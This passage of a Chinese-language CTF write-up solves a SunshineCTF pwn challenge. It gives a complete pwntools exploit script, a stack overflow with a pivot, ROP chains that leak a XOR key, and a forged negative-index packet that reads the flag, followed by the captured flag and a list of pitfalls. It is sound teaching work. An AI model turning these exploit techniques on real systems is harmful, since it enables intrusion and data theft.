會繼續跑 `SUBMIT` 剩下的：

```
401f14:  test rax,rax
401f17:  jle  401f2f
401f19..401f2a: write(1, "OK\n", 3)
401f2f:  add  rsp,0x40        ; ← rsp += 0x40
401f33:  pop  rbx             ; ← rbx = [rsp]  ; rsp += 8
401f34:  ret                  ; ← rip = [rsp]
```

所以每一段鏈的佈局固定是：

```
read 目標 + 0x00 ~ 0x3f : 隨便 (0x40 bytes)
read 目標 + 0x40        : rbx（我們通常放 0xff，讓下一次 read 讀 255 bytes）
read 目標 + 0x48        : 鏈的第 0 個 qword（ret 目標）
```

這也解釋了 `A2 = A1 + 0x48 + 8*len(chain)` 這個公式。

每一段鏈（d1 / d2 / d3）的佈局都一樣，只是位址不同：

| 位址 | 內容 | 誰讀它 |
|---|---|---|
| `A + 0x00` ~ `A + 0x3f` | 隨便（0x40 bytes 緩衝區） | `read(0, rsp, 0xff)` 寫進來 |
| `A + 0x40` | `rbx`（下一段的讀取長度，通常 0xff） | `add rsp,0x40` 之後的 `pop rbx` |
| `A + 0x48` | 鏈的第 0 個 qword（`ret` 的目標） | `pop rbx` 之後的 `ret` |
| `A + 0x48 + 8n` | 鏈的其他 qword | 每個 gadget 的 `ret` |

| 段落 | A（= `read` 目標） | 實際數值 | 備註 |
|---|---|---|---|
| d1 | `A1 = NOTES+8` | `0x40a188` | 洩漏 XOR key |
| d2 | `A2 = A1+0x48+8*11` | `0x40a228` | 寫偽造封包進 fd 3 |
| d3 | `A3 = A2+0x48+8*14` | `0x40a2e0` | 接 `RELAY_RX` 收 flag |

> 💡 **為什麼「鏈的起點」等於「`read` 的目標」？**
> 因為 `0x401f07` 是用 `ret` 跳進去的：那一刻 `rsp` 剛好指向「前一段鏈結束的下一個 qword」，
> 而 `0x401f07` 的 `read(0, rsp, bl)` 就是從 `rsp` 開始寫。
> 所以 **`read` 的寫入起點 = 下一段鏈的起點**，
> 這就是 `A2 = A1 + 0x48 + 8*len(chain)` 的由來
> （`0x48` 是鏈相對於 `A1` 的起點，`8*len(chain)` 是上一段鏈佔用的長度）。
> 千萬不要誤會成「鏈要放在 read 目標 + 0x48」——那是同一段鏈**內部**的偏移。

---

## 7. Exploit 流程（三階段）

> 完整、可直接執行的程式在 `pwn7/exploit.py`（本文只拆解關鍵段落；卡住時直接看那份）。
>
> ⚠️ **下面這段是「照抄就能跑」的完整版，千萬不要漏掉「等提示字元 / 等 `OK\n`」的那幾行。**
> `SUBMIT`、以及每一次 `read(0, rsp, bl)` 讀完之後，程式都會印 `OK\n`；
> 如果沒把它收乾淨，它就會被當成「key 的前 4 bytes」，整條鏈會用**錯的 key** 加密而失敗
> （症狀是「什麼都沒印」或「莫名斷線」，非常難查）。
> 實測：只漏掉下面第 ③ 個 `recvuntil(b'OK\n')`，`recvn(6)` 收到的就是
> `b'OK\n' + key[0]`（例如 `b'OK\n\x1c\xcc\xdb'`）而不是「4 bytes key + 2 bytes 雜訊」。

```python
from pwn import *

context.arch      = 'amd64'
context.log_level = 'info'

POP_RSP       = 0x401523   # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
POP_RDI       = 0x401529   # pop rdi ; ret
POP_RSI       = 0x401dd5   # pop rsi ; ret
POP_RBX       = 0x401f33   # pop rbx ; ret
WRITE_RDX_RAX = 0x401c32   # mov rdx,rax ; jmp write@plt  -> write(rdi, rsi, rax)
SUBMIT_READ   = 0x401f07   # xor edi,edi ; movzx edx,bl ; mov rsi,rsp ; call read
RELAY_RX      = 0x401fda   # mov edx,0x100 ; mov rsi,rbx ; mov edi,3 ; call read
KEY           = 0x405060   # XOR key（4 bytes）
NOTES         = 0x40a180   # NOTE 筆記區（已知位址的可寫區）
PIVOT_TOP     = NOTES - 0x18   # pop rsp 的落點
A1            = NOTES + 8      # 第一次 pivot read 的目標 = 0x40a188


def xor_key(data, key):
    ks = key[::-1]
    return bytes(c ^ ks[i % 4] for i, c in enumerate(data))


io = process('./service')          # 遠端就改成 remote('chal.sunshinectf.games', 26007)
io.recvuntil(b'sh> ')                                   # ① 等第一個提示字元

io.send(b'NOTE 0 ' + p64(SUBMIT_READ)[:3] + b'\n')      # 階段 0
io.recvuntil(b'sh> ')                                   # ② 等 NOTE 完成

stage  = b'A' * 64 + p64(0xff) + p64(POP_RSP) + p64(PIVOT_TOP) + p64(0) * 3
assert len(stage) == 112
io.send(b'SUBMIT %d\n' % len(stage) + stage)            # 階段 1
io.recvuntil(b'OK\n')                                   # ③ SUBMIT 自己的 OK\n

# ---- 階段 2：把鏈放進 255 bytes 的緩衝區 ----------------------------------
d1 = bytearray(b'\0' * 255)        # 長度 = 0x401f07 的 bl（由 stage 的 p64(0xff) 決定）
d1[0x40] = 0xff                    # → 下一次 read 的長度
chain  = [POP_RDI, 1, POP_RSI, KEY, WRITE_RDX_RAX,
          POP_RSI, KEY + 3, WRITE_RDX_RAX,
          POP_RBX, 0xff, SUBMIT_READ]
A2 = A1 + 0x48 + 8 * len(chain)    # 下一段的 read 位址
d1[0x48:0x48 + 8 * len(chain)] = b''.join(p64(x) for x in chain)   # 鏈從 A1+0x48 開始
io.send(bytes(d1))
io.recvuntil(b'OK\n', timeout=3)   # ④ 這次 read 印的 OK\n
leak = io.recvn(6, timeout=3)      # ⑤ 6 bytes 才是 key（前 4 bytes）
key = leak[:4]

# ---- 階段 3：同一個模式，只是把 write 的 fd 改成 3 -------------------------
d2 = bytearray(b'\0' * 255)
d2[0:8] = xor_key(p8(3) + b'\x00\x04' + p8(0) + p32(0xfffffffc), key)
chain  = [POP_RDI, 3, POP_RSI, A2, WRITE_RDX_RAX,
          POP_RSI, A2 + 3, WRITE_RDX_RAX,
          POP_RSI, A2 + 6, WRITE_RDX_RAX,
          POP_RBX, 0xff, SUBMIT_READ]
A3 = A2 + 0x48 + 8 * len(chain)
RESP = A3 + 0x60
d2[0x48:0x48 + 8 * len(chain)] = b''.join(p64(x) for x in chain)
io.send(bytes(d2))
io.recvuntil(b'OK\n', timeout=3)   # ⑥ 這次 read 印的 OK\n

# ---- 階段 4 ---------------------------------------------------------------
time.sleep(0.7)                    # 等保險箱的回覆到齊
d3 = bytearray(b'\0' * 120)
d3[0x40:0x48] = p64(RESP)          # rbx = RELAY_RX 的緩衝區
d3[0x48:0x50] = p64(RELAY_RX)      # ret → read(3, RESP, 0x100) + 解密 + 印出
io.send(bytes(d3))
print(io.recvall(timeout=3))
```

> 📖 **先定義 `d1` / `d2` / `d3` 是什麼**（原本的 §7 只出現 `d2[8]`，卻從沒定義 `d2`）：
> `d1` / `d2` 是「一段鏈的完整輸入」＝ `bytearray(b'\0' * 255)`（255 = 那次 `read` 的 `bl`），
> 其中 `[0x40]` 放 `rbx`（下一段的長度）、`[0x48]` 開始放鏈。
> `d3` 只用到前 `0x50` bytes，所以給 120 bytes 也夠。

> 💡 **`read()` 的長度與「實際交付幾個 byte」是兩件事**：
> `read(0, rsp, bl)` 的 `bl` 由鏈上的 `POP_RBX` 決定（我們放 `0xff` = 255），
> 但 `read` **回傳的是「這次實際收到幾個 byte」**，不是 255。所以：
> * 我們用**一次** `io.send()` 把整段 `d1`（255 bytes）送出去 → 核心一次交付，鏈完整。
> * `d3` 只需要覆蓋到 `+0x50`（`rbx` 與 `ret` 目標），所以 120 bytes 就夠。
> * 反過來說，**不能**把 `d1` 切成好幾次小 `send()`：`read` 可能只收到前半段，
>   鏈就會用半截資料執行而 crash。

### 階段 0：種下 pivot 目標

```python
io.send(b'NOTE 0 ' + p64(0x401f07)[:3] + b'\n')   # .bss[0x40a180] = 0x401f07
```

### 階段 1：SUBMIT 溢位 + pivot

```python
stage  = b'A' * 64 + p64(0xff)                        # 塞滿 0x40 buffer + saved rbx=0xff
stage += p64(POP_RSP) + p64(PIVOT_TOP) + p64(0) * 3   # pop rsp; ...; ret
# 注意：上面那 3 個 p64(0) 其實**不會被讀到**！pop rsp 一執行完 rsp 就變成 PIVOT_TOP，
# 後面 pop r13/r14/r15 讀的是 .bss 裡 [0x40a168]~[0x40a178] 的值（那裡本來就是 0）。
# 留著只是為了讓 stage 長度剛好 112（= 0x40 + 8 + 8 + 8*3 + 8），對齊好看。
io.send(b'SUBMIT %d\n' % len(stage) + stage)
```

> 💡 溢位 payload 的 offset 對照：`0x40` 是緩衝區大小、`0x40` 的位置是 `saved rbx`（= 0xff）、
> `0x48` 的位置才是**被覆蓋的返回位址**（= `POP_RSP` 的位址）。
> `pop rsp` 再從 `[S+0x50]` 讀出 `PIVOT_TOP`（`S` = SUBMIT 當時的 `rsp`）。

### 階段 2：第一次 pivot read（洩漏 XOR key）

送到 `0x40a188`，長度 `0xff`：

```
chain = [ POP_RDI, 1, POP_RSI, KEY, WRITE_RDX_RAX ]   # write(1, 0x405060, rax)
chain += [ POP_RSI, KEY+3, WRITE_RDX_RAX ]            # write(1, 0x405063, 3)
chain += [ POP_RBX, 0xff, SUBMIT_READ ]               # 續接下一段
```

* ⚠️ **`rax` 到底是多少？這裡很反直覺。**
  你可能會想：「`read` 讀了 0xff bytes，所以 `rax = 0xff`，
  那 `write(1, KEY, 0xff)` 就會一次洩漏 255 bytes」。**錯。**
  `0x401f07` 是 `SUBMIT` 函式的**中段**，`read` 回來之後程式會繼續往下跑：

  ```asm
  401f14:  test rax,rax
  401f17:  jle  401f2f
  401f19:  mov  edx,3
  401f1e:  lea  rsi,[rip+0x110b]      ; "OK\n"
  401f25:  mov  edi,0x1
  401f2a:  call write@plt             ; ← 這次 write 的回傳值 = 3，蓋掉了 rax！
  401f2f:  add  rsp,0x40
  401f33:  pop  rbx
  401f34:  ret
  ```

  所以鏈開始執行的那一刻 **`rax = 3`**（`write("OK\n")` 的回傳值）。

  * 第 1 個 `WRITE_RDX_RAX` → `write(1, 0x405060, 3)` → key 的前 3 bytes
  * 第 2 個 `WRITE_RDX_RAX` → `write(1, 0x405063, 3)` → 第 4 個 key byte + 2 bytes 雜訊

  合計 **6 bytes**（4 bytes key + 2 bytes 雜訊），
  正好對應 exploit 裡的 `leak = io.recvn(6)` 與 log 印出的 `leak=1cf20c050000`。

  > 💡 **典型 ROP 陷阱**：「gadget 執行完 `rax` 是多少」跟你想像的常常不一樣。
  > 跳到函式中段時，函式**剩下的程式碼會繼續執行**，並且可能改掉 `rax`。
  > 唯一可靠的做法是在 gdb 裡實際看。

* `key = leak[:4]`，得到 `1cf20c05`。

```
[+] XOR key = 1cf20c05
```

### 階段 3：把偽造封包寫進 fd 3

送到 `0x40a228`：

```python
req = xor_key(p8(3) + b'\x00\x04' + p8(0) + p32(0xfffffffc), key)
chain  = [POP_RDI, 3, POP_RSI, A2, WRITE_RDX_RAX]   # write(3, A2, rdx)
chain += [POP_RSI, A2+3, WRITE_RDX_RAX]             # write(3, A2+3, rdx)
chain += [POP_RSI, A2+6, WRITE_RDX_RAX]             # write(3, A2+6, rdx)
chain += [POP_RBX, 0xff, SUBMIT_READ]
```

* `rdx = rax = 上一次 write 的回傳值 = 3`，所以每次只能寫 3 bytes
  → 切成 3 段寫完 9 bytes。
* ⚠️ **為什麼可以多送第 9 個 byte？**
  `req` 其實只有 8 bytes（`p8(3) + b'\x00\x04' + p8(0) + p32(0xfffffffc)`），
  但鏈是 3 + 3 + 3 = 9 bytes 送出去的，第 9 個 byte 是 `d2[8]`（= `0x00`）。
  它**不會**被這次的封包用掉，而是留在 socket 裡等保險箱下一次讀標頭 ——
  對本次流程無害（保險箱下一次讀標頭時，`op = 0` 不是 1~4，只會回一個錯誤，
  而那時我們已經把 flag 印完了）。
  **不要以為「多送 1 byte 不會被檢查」是通則**：這裡能混過去，是因為
  「多出來的 byte 剛好落在下一條協定訊息的最前面，而我們不在乎那條訊息」。
* 保險箱收到後執行 `op=3, index=-4` → `pread(flag_fd, ...)` → 回傳 flag。

### 階段 4：把 flag 印出來

```python
time.sleep(0.7)                       # 等保險箱的回覆到齊
d3[0x40:0x48] = p64(RESP)             # rbx = A3+0x60  (RELAY 的緩衝區 = rsp+0x10)
d3[0x48:0x50] = p64(0x401fda)         # ret → read(3, rbx, 0x100) + 解密 + 印出
```

進入 `0x401fda` 時 **`rsp = A3 + 0x50`**（因為 `ret` 已經把 `[A3+0x48]` 這個目標位址彈掉了，
`A3+0x48` 是鏈的第 0 個 qword，彈掉之後 `rsp` 前進 8 → 變成 `A3+0x50`）。

接下來 `RELAY`（`0x401fda` 之後）解析標頭時，全部都以 **`rsp+0x10`** 為基準：

```asm
40200a:  movsx dx, BYTE PTR [rsp+0x11]      ; 標頭 byte1
402010:  movsx ax, BYTE PTR [rsp+0x12]      ; 標頭 byte2
40201b:  cmp  BYTE PTR [rsp+0x10],0x0       ; 標頭 byte0 (op)
402032:  lea  rsi,[rsp+0x14]                ; payload 起點 = 標頭 + 4
```

所以收到的資料（標頭）必須落在 `rsp+0x10`：

```
RESP = (A3 + 0x50) + 0x10 = A3 + 0x60
```

而且 `0x401fda` 的第一道指令是 `mov rsi,rbx`，它是拿 **`rbx`** 當 `read` 的目的位址，
所以我們也要在鏈裡把 `rbx` 設成 `RESP` —— 這就是上面 `d3[0x40:0x48] = p64(RESP)` 的用途
（`pop rbx` 讀 `[A3+0x40]`）。兩者必須一致：`rbx == rsp+0x10 == A3+0x60`。

> ⚠️ 我們是**跳到 `0x401fda`（`RELAY` 的中段）**，
> 所以 `RELAY` 開頭那條 `0x401fb9: lea rbx,[rsp+0x10]` **不會執行**，
> `rbx` 完全是我們自己設的。位址算對、`rbx` 設對，兩件事缺一不可。

`read(3, RESP, 0x100)` 收到標頭 + flag，接著解密、檢查（`op==0`、
`len <= 收到長度-4`）、然後 `write(1, payload, len)` —— **flag 就印出來了。**

> 💡 exploit 最後用的 `io.recvall(timeout=3)` 意思是「一直收到 3 秒內沒有新資料為止」，
> 用來把 `OK\n` + flag 一次收乾淨，不需要知道確切長度。
> （相對地，前面洩漏 key 時長度確定是 6 bytes，所以用 `io.recvn(6)`。）

---

## 8. 執行結果

```
$ python3 exploit.py REMOTE
[+] Opening connection to chal.sunshinectf.games on port 26007: Done
[*] stage2 pre=b'OK\n' leak=1cf20c050000 A2=0x40a228
[+] XOR key = 1cf20c05
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[+] raw  : b'OK\nsun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n\n'

[+] FLAG: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
```

本地（`flag.txt` = `SUNSHINE{local_test_flag}`）：

```
[+] raw  : b'OK\nSUNSHINE{local_test_flag}\n\n'
```

✅ **Flag：`sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}`**
（"negative handles open secret doors" —— 就是在講負索引越界 😄）

---

## 9. 常見坑

1. **`p16()` 是大端還小端？** → pwntools 的是 **little-endian**。
   本題的長度欄位是 **big-endian**，要自己寫 `b'\x00\x04'`。
   送錯會讓保險箱以為 `len = 0x0400`，然後永遠等 1024 bytes 而卡死。
2. **XOR keystream 的順序。** `bswap` + `shr eax,0x18` 的組合
   讓 keystream 是 key 反過來 —— 不是 `key[i&3]`，而是 `key[3-(i&3)]`。
   寫錯會送出一堆亂碼。
3. **`bl` 只有 8 bits。** `SUBMIT 256` 的 `bl` 會是 `0`。
   要注意實際發生的事：程式在**還沒進 `read` 之前**就被擋下來了 ——
   `0x401eed: test al,al` / `0x401eef: je 0x401f38`，
   跳到 `0x401f38` 後印出 `ERR bad size`，然後
   `add rsp,0x40; mov edx,0xd; mov edi,1; lea rsi,[rip+…]; pop rbx; jmp write@plt`
   —— 結尾是**尾呼叫（tail call）`jmp write@plt`，不是 `ret`**
   （`write` 返回時直接回到呼叫端；跟 `0x401f34` 的 `ret` 不一樣）。
   （所以「`read` 讀 0 bytes 什麼都不會發生」並不正確 —— 根本不會走到 `read`。）
   實測：`printf 'SUBMIT 256\n' | ./service` → `ERR bad size`。
   要用的長度必須是 1~255。
4. **`read(0,rsp,bl)` 讀進來的資料是「從 `rsp` 開始」**，
   而 read 回傳後程式還會 `add rsp,0x40; pop rbx; ret`。
   所以每一段鏈的佈局是：**`read` 目標 + `0x40` = `rbx`、`read` 目標 + `0x48` = 鏈的第 0 個
   qword**（階段 1 的「`read` 目標」是 `SUBMIT` 當時的 `rsp`；階段 2 之後是 `A1` / `A2` / `A3`）。
   忘記補這個 offset 是最常見的錯。
5. **`rdx` 不能靠 `pop rdx`。** 這支程式**沒有 `pop rdx` gadget**（`grep 'pop    rdx'` 沒有輸出），
   所以設不了長度。→ 用 `0x401c32`（`mov rdx,rax; jmp write`）。
   （補充：glibc 的 `read`/`write` wrapper 其實**不會**動 `rdx`，
   真正的理由就是「沒有 `pop rdx`」。）
6. **seccomp 讓 `execve` 直接殺掉行程。**
   如果你不小心跳到 `system()`，你會看到行程「莫名其妙就死了」——
   那是 `SECCOMP_RET_KILL_PROCESS`。用 `seccomp-tools dump` 或
   手動解 BPF 就能確認。
7. **`fork()` 之後 key 共用，但 `getpid()` 不同。**
   保險箱的 `getpid()` 是子行程的，但 key 是**父行程 fork 前**算好寫進記憶體的，
   所以兩邊一致。不要試圖自己算 key，要用洩漏的。
8. **`time.sleep(0.7)` 不是裝飾。** 保險箱是非同步的，
   太早去 `read(3, ...)` 會讀不到完整資料，RELAY 的長度檢查就會失敗而不印 flag。

---

## 10. 一頁速查

```
架構   : fork 出前台(seccomp, 我們對話的對象) + 保險箱(有 flag fd)
seccomp: 只允許 read/write/close/mmap/mprotect/brk/rt_sigreturn/exit_group
         → 不能 execve，只能借保險箱的手

漏洞 1 : SUBMIT 0x401ed0  read(0, rsp, bl) 進 0x40 緩衝區 (offset 0x48 = ret)
漏洞 2 : 前台無法自己送「長度 > 0 的封包」給保險箱（RELAY 0x401fb2 xor eax,eax
         → 標頭長度永遠 0），而 binary 裡沒有 pop rdx → 要自己想辦法組封包
漏洞 3 : 保險箱 op3 用 movsxd + jg 檢查 index → 負索引
         index=-4 → 0x4060b0-0x1030 = 0x405080 = fd 槽#0 (flag fd) → pread 讀 flag

利用   :
 1. NOTE 0 <3 bytes>  → .bss[0x40a180] = 0x401f07
 2. SUBMIT 112        → 溢位 → pop rsp 搬到 0x40a168 → ret 到 0x401f07
 3. read(0, rsp, 0xff) 續接；鏈一開始 rax = 3（被 SUBMIT 的 write(1,"OK\n",3) 蓋掉），
    所以兩次 write(1, KEY, 3) + write(1, KEY+3, 3) = 只洩漏 6 bytes 的 key
 4. write(3, req, 3) x3 送出 {op=3, len=4, pad=0, index=-4}（已加密）
 5. ret 到 0x401fda → read(3, RESP, 0x100) + 解密 + 印出 → flag
```

> ⚠️ 一定要 `cd pwn7/` 之後再跑（`python3 exploit.py`），
> 因為 exploit 用的是相對路徑 `./service`；
> 或直接用 `wp/run_all.sh`（它會自動 cd 進各題目目錄）。
> 在 repo 根目錄執行會看到 `[ERROR] './service' does not exist`。
